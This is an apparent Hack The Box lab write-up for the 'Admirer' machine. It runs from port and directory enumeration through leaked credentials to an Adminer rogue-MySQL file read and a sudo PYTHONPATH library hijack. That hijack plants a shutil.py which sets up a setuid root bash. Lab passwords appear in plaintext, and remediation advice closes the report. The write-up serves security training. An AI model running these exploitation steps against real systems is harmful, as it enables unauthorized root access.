# [HTB] Admirer - Penetration Testing Report

## Executive Summary
* **Target OS:** Linux
* **Difficulty:** Easy
* **Target IP:** 10.129.229.101
* **Vectors Used:** Adminer 4.7.8 LFI/SSR Vulnerability & Python Library Hijacking

---

## 1. Reconnaissance

Port scan has been done via nmap against target.
```bash
$ nmap -sV -sC -p- 10.129.229.101 -oN
```
```bash
NSE Timing: About 97.90% done; ETC: 01:11 (0:00:00 remaining)
Nmap scan report for 10.129.229.101
Host is up (0.76s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.93 seconds
```
<br>

from the result of scan above, there are three opened ports, which are potentially vulnerable for this system.
Detailed information are shown below:
|port|status|service|
|:---|:---|:---|
|21|open|FTP(vsftpd 3.0.3)|
|22|open|SSH(OpenSSH 7.4p1|
|80|open|HTTP(Apache httpd 2.4.25|
<br>
Based on the given information, enumeration was initiated to opened port 21. Anonymous logon method was initated, however,
permission was denied to access.

Since there were no information given about SSH logon credentials, web app enumeration was initiated for further reconnaissance.  
[This](./images/AdmirerWebApp.png) is the web page running on the target system.


## 2. Web Enumeration

Since there was no revealed information about web service, web content discovery was inevitable. For the task, `gobuster` and `ffuf` was used, specifically looking for any .php or .txt files included on the web service.
```bash
gobuster dir -u http://10.129.229.101/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt
```
```bash
===============================================================
[+] Url:                     http://10.129.229.101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 279]
.htaccess            (Status: 403) [Size: 279]
.hta.txt             (Status: 403) [Size: 279]
.hta.php             (Status: 403) [Size: 279]
.htpasswd.txt        (Status: 403) [Size: 279]
.htaccess.txt        (Status: 403) [Size: 279]
.htaccess.php        (Status: 403) [Size: 279]
.htpasswd.php        (Status: 403) [Size: 279]
.htpasswd            (Status: 403) [Size: 279]
assets               (Status: 301) [Size: 317] [--> http://10.129.229.101/assets/]
```
<br>
<br>

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.229.101/FUZZ -o .php,.txt
```
```bash
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.229.101/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Output file      : .txt,.php
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 308ms]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 308ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 305ms]
assets                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 304ms]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 304ms]
index.php               [Status: 200, Size: 6051, Words: 385, Lines: 154, Duration: 409ms]
robots.txt              [Status: 200, Size: 138, Words: 21, Lines: 5, Duration: 561ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 286ms]
:: Progress: [4750/4750] :: Job [1/1] :: 97 req/sec :: Duration: [0:00:44] :: Errors: 0 ::
```
<br>

Based on the scan, we discovered `robots.txt`, `index.php` on this web service. Since the status of both files is not `forbidden(403)`, it is `allowed(200)` to look into the contents of the discovered files. It is discovered that `index.php` redirects to the main page instead of showing its content, the only option left is to check the content of `robots.txt`.
```bash
http://10.129.229.101/robots.txt
```


```bash
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```
<br>
According to `robots.txt`, checking /admin-dir is necessary to gather further information about access point. However, access to the directory was denied due to the permission. `ffuf` was used to discover hidden contents under this directory.

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.229.101/admin-dir/FUZZ -o php,txt
```
```bash
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.229.101/admin-dir/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Output file      : php,txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 2648ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 2673ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3625ms]
contacts.txt            [Status: 200, Size: 350, Words: 19, Lines: 30, Duration: 299ms]
credentials.txt         [Status: 200, Size: 136, Words: 5, Lines: 12, Duration: 301ms]
:: Progress: [4750/4750] :: Job [1/1] :: 98 req/sec :: Duration: [0:00:52] :: Errors: 0 ::
```
<br>

Among the discovered contents, only permitted contents under `/admin-dir` are `contacts.txt` and `credentials.txt`. New testable credentials are found in the contents of `credentials.txt`. New e-mail addresses are also discovered under `contacts.txt`.
```bash
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```
```bash
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```
<br>

Using the discovered ftp account, accessing to ftp server of the target was successful.
```bash
# ftp 10.129.229.101                                                                                                
Connected to 10.129.229.101.
220 (vsFTPd 3.0.3)
Name (10.129.229.101:kali): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
<br>

Enumerating the ftp server, 2 readable files are discovered.
```bash
ftp> dir

229 Entering Extended Passive Mode (|||65347|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
```
<br>

discovered 2 files that are seemingly related to the contents of database under the system, it is recommended to check the contents of the file.
```bash
ftp> get html.tar.gz

local: html.tar.gz remote: html.tar.gz
229 Entering Extended Passive Mode (|||53884|)
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
100% |********************************************************************************|  5147 KiB  430.16 KiB/s    00:00 ETA
226 Transfer complete.
5270987 bytes received in 00:12 (399.13 KiB/s)
ftp> get dump.sql

local: dump.sql remote: dump.sql
229 Entering Extended Passive Mode (|||19823|)
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
100% |********************************************************************************|  3405        6.50 KiB/s    00:00 ETA
226 Transfer complete.
```
<br>

Below is the contents of uncompressed file
```bash
tar -xvf html.tar.gz
```
```bash
assets  html.tar.gz  images  index.php  robots.txt  utility-scripts  w4ld0s_s3cr3t_d1r
```
```bash
/utility-scripts
admin_tasks.php  db_admin.php  info.php  phptest.php
```
<br>

```bash
cat db_admin.php  
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
```
<br>

Discovered credential of username `Waldo` as well in the `index.php`
```bash
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
```
<br>

Attempt to login as user `waldo` via ssh was failed with the credentials above. However, contents of `admin-dir` was discovered in the directory name `w4ld0s_s3cr3t_d1r`, enumeration of `utility-scripts` was legit looking. (fix)
```bash
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.129.229.101/utility-scripts/FUZZ -e .php
```
```bash
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.229.101/utility-scripts/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 410ms]
.htpasswd.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 410ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 410ms]
.htaccess.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 410ms]
adminer.php             [Status: 200, Size: 4295, Words: 189, Lines: 52, Duration: 303ms]
info.php                [Status: 200, Size: 83842, Words: 4024, Lines: 962, Duration: 301ms]
```
<br>

adminer.php was found as a content under the `utility-scripts`. Accessing to the discovered directory led to the following page (picture)

## Adminer 4.7.8 LFI/SSR Vulnerability
It is discovered that the vulnerability allows attacker to connect to the victim's database via creating mysql user account connected to the address of victim. Below is the process of how attacker will exploit LFI/SSR Vulnerability.
```bash
sudo systemctl start mysql
```
<br>

1. create user account and database owned by the user on the victim's database server to gather vulnerable information via execution of MySQL command
```bash
MariaDB [(none)]> create user 'first'@'10.129.229.101' identified by 'password'
    -> ;
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]> grant all privileges on *.* to first@10.129.229.101
    -> ;
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]> flush privileges;
Query OK, 0 rows affected (0.000 sec)

MariaDB [(none)]> create database admirer;
Query OK, 1 row affected (0.000 sec)

MariaDB [(none)]> use admirer;
Database changed
MariaDB [admirer]> create table demo(name varchar(255));
Query OK, 0 rows affected (0.005 sec)

MariaDB [admirer]> exit
```
<br>

2. change MySQL configuration locally to allow attacker's access to victim's database server
```bash
vi /etc/mysql/mariadb.conf.d/50-server.cnf

# Instead of skip-networking the default is now to listen only on
# localhost which is more compatible and is not less secure.
#bind-address            = 127.0.0.1
bind-address            = <attacker's IP address>
```
<br>

3. Restart mysql service
```bash
sudo systemctl restart mysql
```
<br>

4. Access victim's database server via created credential
```
picture
```
<br>

5. Following sql command allows attacker to access on the execution field
```bash
load file local infiile '/var/www/html/index.php'
into table <created db name>.<created table name>
fields terminated by "\n"
```
<br>

6. Execution result could be seen on `select` section (picture)
<br>

## SSH
credential has been found in the `index.php` file. Using the following credential allows attacker to access into the victim's internal server, allowed attacker to successfully gain access as privilege of user `waldo`.
(picture & command)

## privilege escalation
Since attacker knows the password of user `waldo`, situation allows for attacker to check the possibility of command execution as root user's privilege. Here is the result
```bash
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```
<br>

user `waldo` could run the following script `admin_tasks.sh` as root user's privilege, which potentially allows to gain access on the system as root user.
Checking the content of the script, on the `backup_web()` function, it is confirmed that it runs the script named `backup.py` located on directory `/opt/scripts`.
```
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```
<br>

Looking into the content of `backup.py`, it was importing `make_archive` from module name `shutil`. Also, because of the `SETENV` option, it is allowed for attacker to hijack the module by changing the environment variable `PYTHONPATH`, which allows attacker to execute any dangerous command as root user's privilege.

1. Make directory under `/tmp` or `/dev/shm` as permission of user `waldo`
```bash
waldo@admirer:/tmp$ mkdir /tmp/new
```
<br>

2. Make python module named `shutil.py` under the created directory
```bash
waldo@admirer:/tmp$ vi /tmp/new/shutil.py
```
<br>

3. Inject malicious script inside for privilege escalation
```python
import os;
os.system('cp /bin/bash /tmp/bash; chown root:root /tmp/bash; chmod 4755 /tmp/bash')
```
<br>

4. Code execution
```bash
waldo@admirer:/tmp/new$ sudo PYTHONPATH=/tmp/new /opt/scripts/admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
waldo@admirer:/tmp/new$ Traceback (most recent call last):
  File "/opt/scripts/backup.py", line 3, in <module>
    from shutil import make_archive
ImportError: cannot import name 'make_archive'
^C
waldo@admirer:/tmp$ ls
bash  new  vmware-root
waldo@admirer:/tmp$ ./bash -p
bash-4.4# id
uid=1000(waldo) gid=1000(waldo) euid=0(root)
```
Attacker successfully gain access to the system as root user's permission.

# Remediation
1. Update tool to recent version & limit access:
It is recommended to update Adminer, remove it if it is considered unnecessary for security of web application. Also, apply ACL on /admin-dir/ for blocking blind access from unknown IP

2. Managing vulnerable information under source code:
Instead of hard coding critical credentials such that allows access to DB in `index.php`, utilize safe environment variable or Secret Manager  

3. Limit access to sudo privileges and environment variables
Remove SETENV option from /etc/sudoers for preventing manipulation of PYTHONPATH in the process of sudo privilege execution. It is also recommended to use env_reset variable as well as same logic.





